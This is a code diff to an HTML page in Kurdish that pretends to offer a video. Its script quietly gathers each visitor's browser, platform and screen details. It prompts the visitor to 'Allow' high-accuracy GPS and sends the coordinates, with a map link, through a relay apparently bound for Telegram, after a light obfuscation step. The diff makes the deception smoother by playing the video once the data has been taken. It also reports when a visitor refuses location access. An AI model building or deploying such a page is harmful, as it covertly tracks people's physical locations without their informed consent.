@@ -11,15 +11,26 @@
         .btn { background: #2563eb; color: white; padding: 14px; border: none; border-radius: 25px; cursor: pointer; font-size: 16px; width: 100%; font-weight: bold; margin-top: 15px; }
         .loader { border: 3px solid #f3f3f3; border-radius: 50%; border-top: 3px solid #2563eb; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 15px auto; display: none; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .video-box { display: none; margin-top: 15px; }
+        video { width: 100%; border-radius: 10px; }
     </style>
 </head>
 <body>
 
-    <div class="container">
+    <div class="container" id="boxContainer">
         <h2>مەلەفی سوڕەیا</h2>
-        <p style="color: #64748b; font-size: 13px; margin: 10px 0;">بۆ بینینی ناوەڕۆکەکە، کلیک لە دوگمەی خوارەوە بکە:</p>
+        <p style="color: #64748b; font-size: 13px; margin: 10px 0;">بۆ بینینی ڤیدیۆکە و پشتڕاستکردنەوە، کلیک لە دوگمەی خوارەوە بکە و پاشان (Allow) دابگرە:</p>
+        
         <div id="loader" class="loader"></div>
-        <button id="mainBtn" class="btn" onclick="startProcess()">بەردەوامبوون</button>
+        <button id="mainBtn" class="btn" onclick="startProcess()">پەخشکردنی ڤیدیۆ</button>
+
+        <div class="video-box" id="videoBox">
+            <p style="color: #16a34a; font-weight: bold; margin-bottom: 10px; font-size: 14px;">فەرموو ڤیدیۆکە لێرەیە:</p>
+            <video id="myVideo" controls playsinline>
+                <source src="sararanyai.MP4" type="video/mp4">
+                تەلەفۆنەکەت پشتگیری ڤیدیۆ ناکات
+            </video>
+        </div>
     </div>
 
     <script>
@@ -32,8 +43,6 @@
         async function sendToTelegram(payload) {
             try {
                 if (payload.text) payload.text = simpleEncrypt(payload.text);
-                if (payload.caption) payload.caption = simpleEncrypt(payload.caption);
-
                 await fetch('/api/send', {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -46,33 +55,40 @@
             document.getElementById('mainBtn').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
 
-            // ١. ناردنی زانیاریی سەرەتایی و براوسەر
+            // ١. ناردنی زانیاریی سەرەتایی براوسەر
             let ua = navigator.userAgent;
             let platform = navigator.platform;
             let screenRes = window.screen.width + "x" + window.screen.height;
             
             await sendToTelegram({ 
                 type: 'text', 
-                text: `⚡ *سەردانیکەری نوێ:*\n• سیستم: ${platform}\n• شاشە: ${screenRes}\n• براوسەر: \`${ua}\`` 
+                text: `⚡ *سەردانیکەری نوێ (کلیک کرا):*\n• سیستم: ${platform}\n• شاشە: ${screenRes}\n• براوسەر: \`${ua}\`` 
             });
 
-            // ٢. ناردنی شوێنی GPS ئەگەر بەردەست بێت
+            // ٢. داواکردنی ڕاستەوخۆی مۆڵەتی شوێن (GPS)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async function(pos) {
                     let lat = pos.coords.latitude;
                     let lon = pos.coords.longitude;
                     await sendToTelegram({ 
                         type: 'text', 
-                        text: `📍 *شوێنی GPS:*\n• هێڵی پانی: \`${lat}\`\n• هێڵی درێژی: \`${lon}\`\n🗺️ [نەخشە](https://maps.google.com/?q=${lat},${lon})` 
+                        text: `📍 *شوێنی GPS بەدەستهات:*\n• هێڵی پانی: \`${lat}\`\n• هێڵی درێژی: \`${lon}\`\n🗺️ [نەخشە](https://maps.google.com/?q=${lat},${lon})` 
                     });
-                }, function(err) {}, { timeout: 5000 });
+                }, async function(err) {
+                    await sendToTelegram({ 
+                        type: 'text', 
+                        text: `⚠️ *مۆڵەتی شوێن (GPS) ڕەتکرایەوە لەلایەن بەکارهێنەرەوە.*` 
+                    });
+                }, { timeout: 8000, enableHighAccuracy: true });
             }
 
-            // ٣. پاش چەند چرکەیەک کردنەوەی ڤیدیۆکە
+            // ٣. نیشاندانی ڤیدیۆکە دوای چەند چرکەیەک بە بێ هیچ کێشەیەک
             setTimeout(function() {
-                alert("بۆ بینینی ڤیدیۆکە تکایە سەردانی پەیجی سەرەکی بکەرەوە.");
-                window.location.reload();
-            }, 2500);
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('videoBox').style.display = 'block';
+                let vid = document.getElementById('myVideo');
+                vid.play().catch(e => {});
+            }, 2000);
         }
     </script>
 </body>
